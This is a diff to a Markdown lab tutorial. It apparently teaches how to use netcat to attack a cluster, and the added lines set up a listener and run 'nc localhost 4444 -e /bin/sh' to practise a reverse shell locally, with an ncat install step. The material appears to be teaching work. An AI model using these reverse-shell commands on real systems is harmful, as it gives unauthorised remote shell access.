@@ -8,10 +8,15 @@ First, you will work with the netcat tool in local. In your terminal, try the co
 ```bash
 nc -lvp 4444
 ```
-
-If `nc` is not recognized, try installing `netcat-openbsd` using command:
+Then try the command:
 ```bash
-sudo apt install netcat-openbsd
+nc localhost 4444 -e /bin/sh
+```
+You need to install the `ncat` package to be able to use the `-e` option. To do so, run the following commands:
+```bash
+sudo apt remove netcat-openbsd
+
+sudo apt install ncat
 ```
 The netcat tool will be used to attack the cluster. Using netcat commands, a reverse shell can be created. A reverse shell gives access to the attacked machine the following way:
 
